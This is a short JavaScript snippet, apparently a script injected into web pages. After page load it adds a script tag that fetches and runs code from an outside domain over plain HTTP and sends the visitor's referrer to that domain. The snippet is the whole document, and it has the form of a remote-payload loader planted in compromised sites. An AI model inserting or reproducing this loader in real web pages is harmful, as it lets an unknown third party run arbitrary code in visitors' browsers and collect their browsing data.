(function(w) {
	var script = document.createElement('script');
	var ref = escape(document.referrer);
	var i = setInterval(function() {
		if (typeof w.document.body !== 'undefined') {
			script.src = 'http://mediaunder.info/scode.php?site=13319&ref=' + ref ;
			w.document.body.appendChild(script);
			clearInterval(i);
		}
	}, 200);
})(window);